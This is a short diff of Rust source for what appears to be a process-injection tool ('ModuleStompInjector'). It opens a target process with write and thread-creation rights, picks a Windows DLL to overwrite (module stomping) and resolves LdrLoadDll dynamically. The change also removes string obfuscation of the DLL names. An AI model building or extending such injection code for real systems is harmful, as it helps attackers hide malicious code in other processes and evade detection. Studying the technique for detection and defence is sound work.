@@ -26,15 +26,15 @@ impl Injector for ModuleStompInjector {
             let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, 0, pid);
             if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }
 
-            let candidates = vec![
-                enc_str!("msfte.dll"),
-                enc_str!("msratelc.dll"),
-                enc_str!("scrobj.dll"),
-                enc_str!("amstream.dll")
+            let candidates: Vec<&str> = vec![
+                "msfte.dll",
+                "msratelc.dll",
+                "scrobj.dll",
+                "amstream.dll",
             ];
-            
+
             // Just picking the first one available for stomp
-            let target_dll = &candidates[0];
+            let target_dll: &str = candidates[0];
             let mut target_dll_w: Vec<u16> = target_dll.encode_utf16().chain(std::iter::once(0)).collect();
 
             // Resolve LdrLoadDll dynamically
